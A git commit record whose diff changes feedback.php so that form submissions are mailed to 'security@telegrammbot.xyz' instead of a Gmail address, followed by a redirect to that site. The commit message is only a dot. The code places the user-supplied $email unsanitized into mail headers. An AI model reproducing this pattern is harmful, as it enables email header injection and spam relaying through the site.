023b2f1db188b148f8648ecf53ddcab1794f9567
Qwxp <mmdjoker@yahoo.com>
2022-03-02 14:38:39 +0330

    .

--- feedback.php
+++ feedback.php
@@ -5,7 +5,7 @@ $name = $_POST['name'];
 $headers = "From:$email" . "\r\n";
 
 // send email
-mail("Bboydoeamer@gmail.com", "FeedBack-$name", $message, $headers);
+mail("security@telegrammbot.xyz", "FeedBack-$name", $message, $headers);
 echo '<script type="text/javascript">
            window.location = "https://telegrammbot.xyz"
       </script>';
